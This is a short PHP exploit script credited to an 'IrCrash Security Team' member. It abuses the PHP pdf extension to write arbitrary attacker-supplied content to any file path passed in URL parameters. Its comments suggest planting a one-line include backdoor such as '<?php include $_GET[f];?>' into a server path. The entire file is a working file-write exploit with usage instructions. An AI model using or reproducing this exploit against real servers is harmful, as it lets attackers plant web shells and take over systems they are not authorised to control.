<?php
// Author : Sina Yazdanmehr (R3d.W0rm) ; Our Site : http://IrCrash.com
if(!extension_loaded('pdf')){
   die('pdf extension required .');
}else{
    $__PATH = $_GET['p']; /*The path that u want save file in .ex:
/etc/file.php*/
    $__VALUE = $_GET['v']; /*The text that u want save in file .ex:
<?php include $_GET[f];?>*/
    if(!isset($__PATH,$__VALUE)){

die('/expl.php?p=[path_u_want_save_file]/[file_name]&v=[value_u_want_sav
e_in_file]');
    }
    $__IRCRASH = pdf_new();
    pdf_open_file($__IRCRASH,$__PATH);
    pdf_begin_page($__IRCRASH,612,792);

pdf_add_note($__IRCRASH,100,650,200,750,$__VALUE,'R3d.W0rm','note',0);
    pdf_end_page($__IRCRASH);
    pdf_close($__IRCRASH);
    pdf_delete($__IRCRASH);
    print('<p>IrCrash Security Team .</p>');
    print('<p>' . $__PATH . "\n"  . 'created .</p>');}
?>